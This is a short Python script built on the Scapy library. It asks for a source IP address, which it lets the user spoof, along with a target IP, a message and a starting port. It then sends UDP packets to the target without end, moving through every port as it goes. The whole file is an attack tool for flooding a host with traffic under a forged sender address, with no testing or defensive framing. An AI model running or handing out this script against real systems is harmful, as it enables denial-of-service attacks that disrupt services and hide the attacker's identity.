from scapy.all import *

srce = input("Enter Source IP :")
dest = input ("Enter Destination IP :")
size = 0;

a=IP(src= srce, dst = dest)
message = input("Enter Message :")
prt = int(input("Enter Port :"))
#size=int(input("Enter Size Of Packet"))
#a.size()

i=1


while True:
	send(a/UDP(dport = prt)/message)
	prt = prt + 1
	print ("PORT USED : ",prt)
	print ("Total Packets Sent :",i)
	i = i+1
	if prt == 65534:
		prt = 1
